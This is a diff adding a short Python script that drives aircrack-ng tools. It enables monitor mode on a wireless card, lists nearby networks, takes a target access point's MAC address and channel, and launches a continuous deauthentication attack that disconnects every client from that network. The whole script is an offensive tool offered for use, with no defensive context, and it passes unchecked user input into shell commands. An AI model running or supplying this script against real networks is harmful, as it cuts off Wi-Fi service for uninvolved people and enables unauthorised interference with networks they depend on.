@@ -1,0 +1,11 @@
+import os
+os.system("sudo airmon-ng start wlan0")
+print("\nAvailable networks\n")
+os.system("sudo airodump-ng  wlan0mon")
+bssid = input("\nEnter mac address of target: ")
+channel = input("Enter channel of target: ")
+print(bssid)
+os.system("sudo airodump-ng -d "+bssid+" -c "+channel+" wlan0mon")
+input("\nPress enter to start deauth attack")
+os.system("sudo aireplay-ng -0 0 -a "+bssid+" wlan0mon")
+os.system("sudo airmon-ng stop wlan0mon")
